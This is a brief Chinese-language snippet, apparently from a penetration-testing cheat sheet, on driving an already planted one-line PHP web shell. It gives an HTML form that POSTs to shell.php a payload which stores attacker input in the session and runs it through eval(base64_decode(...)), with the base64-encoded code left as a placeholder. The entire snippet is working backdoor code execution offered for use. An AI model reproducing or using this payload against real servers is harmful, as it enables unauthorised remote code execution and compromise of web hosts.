#### 一句话插好后，写表单POST，如
##### xxxxx为base64加密的代码
```Bash
<form action="shell.php" method="POST">
 	<input type="text" name="1" value="@session_start();$_SESSION[chr(90)]=$_POST[chr(124)];@eval(base64_decode($_SESSION[chr(90)]));die();">
 	<input type="text" name="|" value="xxxxx">
 	<input type="submit" id="x">
 </form>
```